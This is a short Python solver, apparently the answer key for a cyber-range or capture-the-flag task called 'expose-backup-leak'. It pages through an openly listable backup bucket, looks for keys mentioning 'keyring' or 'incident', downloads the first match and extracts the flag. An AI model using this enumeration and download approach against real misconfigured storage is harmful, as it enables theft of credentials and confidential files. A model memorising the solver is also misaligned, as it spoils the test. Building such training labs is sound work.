"""Intended-path solver: page through the open listing and fetch the leak."""

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

BUCKET = "nimbus-nightly-backups"


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url()
    sensitive = None
    marker = ""
    for _ in range(20):
        params: dict[str, str | int] = {"max-keys": 8}
        if marker:
            params["marker"] = marker
        page = httpx.get(f"{base}/{BUCKET}", params=params, timeout=10).json()
        hits = [
            item["key"]
            for item in page["objects"]
            if "keyring" in item["key"] or "incident" in item["key"]
        ]
        if hits:
            sensitive = hits[0]
            break
        if not page["is_truncated"]:
            break
        marker = page["next_marker"]

    if not sensitive:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="expose-backup-leak",
                    ok=False,
                    detail="sensitive object never surfaced in listings",
                )
            ]
        )

    res = httpx.get(f"{base}/{BUCKET}/{sensitive}", timeout=10)
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="expose-backup-leak",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else f"no flag inside {sensitive}",
            )
        ]
    )
